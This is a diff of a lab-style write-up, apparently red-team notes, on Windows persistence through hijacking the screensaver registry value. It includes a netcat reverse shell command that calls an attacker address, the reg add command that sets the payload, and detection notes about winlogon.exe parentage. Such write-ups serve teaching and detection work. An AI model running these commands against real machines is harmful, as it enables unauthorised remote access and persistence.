@@ -6,21 +6,23 @@ description: Hijacking screensaver for persistence.
 
 ## Execution
 
-Attacker has a binary that upon execution sends him a reverse shell. To achieve persistence, the attacker can hijack the `SCRNSAVE.EXE` value in `HKCU\Control Panel\Desktop\` to point it to his payload. In my test, I used a netcat reverse shell:
+To achieve persistence, the attacker can modify `SCRNSAVE.EXE` value in the registry  `HKCU\Control Panel\Desktop\` and change its data to point to any malicious file. 
+
+In this test, I will use a netcat reverse shell as my malicious payload:
 
 {% code-tabs %}
 {% code-tabs-item title="c:\\shell.cmd@victim" %}
-```bash
+```csharp
 C:\tools\nc.exe 10.0.0.5 443 -e cmd.exe
 ```
 {% endcode-tabs-item %}
 {% endcode-tabs %}
 
-For simplicity of this exercise, I am using regedit to update the registry \(as if the attacker got the RDP access\):
+Let's update the registry:
 
 ![](../.gitbook/assets/screensaver-registry.png)
 
-The same could be achieved using a native windws binary reg.exe:
+The same could be achieved using a native Windows binary reg.exe:
 
 {% code-tabs %}
 {% code-tabs-item title="attacker@victim" %}
@@ -34,11 +36,9 @@ reg add "hkcu\control panel\desktop" /v SCRNSAVE.EXE /d c:\shell.cmd
 
 ## Observations
 
-Note the process ancestry on the victim system - the reverse shell process traces back to winlogon.exe as the parent process, which is responsible for managing user logons/logoffs - this process ancestry is highly suspect and should make you want to investigate the machine further:
+Note the process ancestry on the victim system - the reverse shell process traces back to winlogon.exe as the parent process, which is responsible for managing user logons/logoffs. This is highly suspect and should warrant a further investigation:
 
 ![](../.gitbook/assets/screensaver-shell%20%281%29.png)
-
-Commandline line argument monitoring:
 
 ![](../.gitbook/assets/screensaver-logs.png)
 
